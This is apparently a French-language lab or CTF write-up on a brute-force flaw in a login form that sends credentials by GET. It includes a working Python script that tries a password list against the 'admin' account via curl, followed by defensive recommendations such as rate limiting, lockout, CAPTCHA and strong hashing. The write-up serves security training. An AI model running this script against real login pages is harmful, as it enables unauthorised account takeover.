# Brute Force

![alt text](Screenshot_flag.png)

## Description

Le Brute Force est une attaque consistant à tester automatiquement une grande quantité de mots de passe jusqu’à trouver celui qui permet l’accès à un compte.

## Comment reproduire la faille

1. Constater que la page de login (**SIGN IN**) utilise une requête GET lors de la soumission du formulaire : `http://<IP_ADRESS>/?page=signin&username=admin&password=<TEST>&Login=Login#`

2. Créer un fichier contenant des mots de passe fréquents : `passwords.txt`

3. Utiliser un script Python pour tester automatiquement les mots de passe:  

    * Exemple de script :
        ```python
        import subprocess
        import sys


        if len( sys.argv ) == 2:
            url = f"http://{sys.argv[1]}/?page=signin"
        else:
            print("Error: please set the IP address in the script parameter")
            exit(1)

        username = "admin"

        with open("passwords.txt", "r") as f:
            for pwd in f:
                pwd = pwd.strip()

                cmd = [
                    "curl", "-s",
                    f"{url}&username={username}&password={pwd}&Login=Login#"
                ]

                result = subprocess.run(cmd, capture_output=True, text=True)
                output = result.stdout

                print(f"[ ] Test : {pwd}")

                if "WrongAnswer" not in output:
                    print("\n=== PASSWORD FOUND ===")
                    print(f"username = {username}")
                    print(f"password = {pwd}")
                    break
            else:
                print("No password found")

        ```

    * Lancer le script : `python3 script.py <IP_ADRESS>` 



4. Résultat:   
    Lorsque le mot de passe correct est testé, le serveur renvoie une page différente.
    Le script affiche alors :  
    ```
    === MOT DE PASSE TROUVÉ ! ===
    username = admin
    password = <mot_de_passe_trouvé>
    ```

5. Se connecter avec l'identifiant `admin` et le mot de passe trouvé par le script


## Recommandation pour empêcher la faille

* Limiter le nombre de tentatives de connexion (rate limiting / lockout)

* Mettre un temps d’attente progressif après plusieurs échecs

* CAPTCHA après un certain nombre de tentatives

* Méta-données de sécurité (IP tracking, alertes)

* Avoir un hash sécurisé des mots de passe (bcrypt/argon2)

* Faire une journalisation des tentatives anormales


## Conclusion

Le manque total de contrôles d’accès et de protections serveur contre les tentatives répétées d’authentification permet d'automatiser des centaines de tests de mots de passe jusqu’à obtenir un accès non autorisé.

Cette faille montre l’importance de mettre en place des mesures minimales de sécurité, telles que le rate-limiting, les délais progressifs, la surveillance des échecs d’authentification et l’utilisation de mots de passe robustes.
Avec une configuration correcte, ce type d’attaque peut être efficacement empêché et l’intégrité du système préservée.